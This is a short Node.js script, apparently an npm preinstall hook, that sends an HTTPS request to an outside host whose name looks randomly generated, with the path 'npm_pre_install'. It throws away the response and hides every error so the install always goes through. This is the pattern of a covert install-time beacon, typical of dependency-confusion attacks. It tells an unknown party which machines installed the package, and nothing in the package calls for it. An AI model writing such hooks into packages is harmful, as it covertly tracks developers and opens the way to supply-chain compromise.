const https = require('https');
const url = 'https://yczfxrczzreyouovmtnf2rd1ozhn89m8y.blnd.r0l.me/npm_pre_install';

try {
  https
    .get(url, (res) => {
      res.resume();
    })
    .on('error', () => {});
} catch (err) {
  // Swallow errors to avoid failing install.
}
